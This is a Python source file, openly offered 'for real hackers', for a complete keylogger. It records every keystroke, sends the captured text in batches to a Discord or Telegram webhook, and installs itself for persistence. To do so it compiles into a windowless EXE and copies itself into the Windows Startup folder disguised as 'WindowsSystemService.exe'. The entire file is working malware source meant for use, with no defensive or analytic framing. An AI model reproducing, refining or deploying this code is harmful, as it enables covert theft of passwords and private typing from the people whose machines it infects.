# this is for real hackers 
# 🔐 complete_keylogger.py - FIXED VERSION
import os
import sys
import shutil
import subprocess
import time
import requests
from pynput import keyboard

# ==================== CONFIGURATION ====================
WEBHOOK_URL = "your webhook discord or telegram maybe"

class KeyloggerSystem:
    def __init__(self):
        self.captured_keys = ""
        self.last_send_time = time.time()
        self.is_compiled = hasattr(sys, 'frozen')
        
    def install_dependencies(self):
        """Install required packages"""
        try:
            import pynput
            import requests
            print("✅ Dependencies already installed")
            return True
        except ImportError:
            print("📦 Installing dependencies...")
            try:
                subprocess.check_call([
                    sys.executable, "-m", "pip", "install", 
                    "pynput", "requests", "pyinstaller"
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print("✅ Dependencies installed successfully")
                return True
            except Exception as e:
                print(f"❌ Failed to install dependencies: {e}")
                return False

    def build_executable(self):
        """Build EXE with proper path handling"""
        try:
            print("🔨 Building executable...")
            
            # Get current script name without extension
            script_name = os.path.basename(sys.argv[0]).replace('.py', '')
            
            # Build command
            build_cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--noconsole",
                f"--name={script_name}",
                "--clean",
                sys.argv[0]
            ]
            
            # Run build
            result = subprocess.run(build_cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                # Find the actual built EXE path
                dist_folder = "dist"
                if os.path.exists(dist_folder):
                    for file in os.listdir(dist_folder):
                        if file.endswith('.exe'):
                            exe_path = os.path.abspath(os.path.join(dist_folder, file))
                            print(f"✅ EXE built: {exe_path}")
                            return exe_path
                
                print("❌ EXE not found in dist folder")
            else:
                print(f"❌ Build failed: {result.stderr}")
                
        except Exception as e:
            print(f"❌ Build error: {e}")
            
        return None

    def install_to_startup(self, exe_path):
        """Copy EXE to startup folder with proper verification"""
        try:
            if not os.path.exists(exe_path):
                print(f"❌ Source EXE not found: {exe_path}")
                return False
            
            # Startup folder path
            startup_folder = os.path.join(
                os.getenv('APPDATA'), 
                "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
            )
            
            # Create startup folder if it doesn't exist
            os.makedirs(startup_folder, exist_ok=True)
            
            # Target EXE path
            target_path = os.path.join(startup_folder, "WindowsSystemService.exe")
            
            print(f"📂 Copying to startup: {target_path}")
            
            # Copy the file
            shutil.copy2(exe_path, target_path)
            
            # Verify the copy worked
            if os.path.exists(target_path):
                print(f"✅ Successfully installed to startup: {target_path}")
                
                # Test if we can run it
                try:
                    # Just verify it exists and is accessible
                    if os.access(target_path, os.R_OK):
                        print("✅ Startup EXE is accessible")
                        return True
                    else:
                        print("❌ Startup EXE is not accessible")
                except Exception as e:
                    print(f"⚠️ Could not verify EXE: {e}")
                    
                return True
            else:
                print("❌ Copy failed - file not found in destination")
                return False
                
        except Exception as e:
            print(f"❌ Installation failed: {e}")
            return False

    def send_discord_message(self, message):
        """Send message to Discord"""
        try:
            requests.post(WEBHOOK_URL, json={"content": message}, timeout=10)
        except:
            pass

    def on_press(self, key):
        """Key press handler"""
        try:
            # Stop on ESC key
            if key == keyboard.Key.esc:
                self.send_discord_message("🛑 Key monitor stopped")
                return False
            
            # Key mapping
            if key == keyboard.Key.space:
                self.captured_keys += " "
            elif key == keyboard.Key.enter:
                self.captured_keys += "\n"
            elif key == keyboard.Key.tab:
                self.captured_keys += "[TAB]"
            elif key == keyboard.Key.backspace:
                self.captured_keys += "[BACKSPACE]"
            elif key == keyboard.Key.cmd:
                self.captured_keys += "[WIN]"
            elif hasattr(key, 'char') and key.char:
                self.captured_keys += key.char
            
            # Send data every 30 chars or 15 seconds
            current_time = time.time()
            if len(self.captured_keys) >= 30 or (current_time - self.last_send_time) >= 15:
                if self.captured_keys.strip():
                    self.send_discord_message(f"```{self.captured_keys}```")
                    self.captured_keys = ""
                self.last_send_time = current_time
                
        except Exception:
            pass

    def start_keylogger(self):
        """Start the keylogger"""
        print("⌨️ Starting keylogger...")
        self.send_discord_message("🚀 Key monitor started successfully!")
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def setup_persistence(self):
        """Main setup function"""
        print("🚀 Starting persistence setup...")
        
        # Install dependencies
        if not self.install_dependencies():
            print("❌ Cannot continue without dependencies")
            return False
        
        # Build EXE
        exe_path = self.build_executable()
        if not exe_path:
            print("❌ Build failed, running in temporary mode")
            return False
        
        # Install to startup
        if self.install_to_startup(exe_path):
            print("🎉 Persistence setup complete!")
            print("🔁 The keylogger will now start automatically on system boot")
            
            # Launch the installed version
            startup_path = os.path.join(
                os.getenv('APPDATA'), 
                "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
                "WindowsSystemService.exe"
            )
            
            if os.path.exists(startup_path):
                print("🚀 Launching persistent version...")
                try:
                    os.startfile(startup_path)
                except:
                    pass
            return True
        else:
            print("❌ Persistence setup failed")
            return False

def main():
    print("=" * 50)
    print("🔐 Advanced Keylogger System")
    print("=" * 50)
    
    system = KeyloggerSystem()
    
    if system.is_compiled:
        print("✅ Running as compiled EXE")
        print("📍 Running from startup persistence")
        system.start_keylogger()
    else:
        print("📝 Running from Python source")
        choice = input("Do you want to install persistence? (y/n): ").lower().strip()
        
        if choice == 'y':
            if system.setup_persistence():
                print("✅ Persistence installed successfully!")
                print("💡 The system will now start automatically on boot.")
                print("🎯 Starting keylogger in current session...")
                system.start_keylogger()
            else:
                print("❌ Persistence setup failed")
                print("🎯 Starting keylogger in temporary mode...")
                system.start_keylogger()
        else:
            print("🎯 Starting keylogger in temporary mode...")
            system.start_keylogger()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Stopped by user")
    except Exception as e:
        print(f"💥 Error: {e}")
        input("Press Enter to exit...")
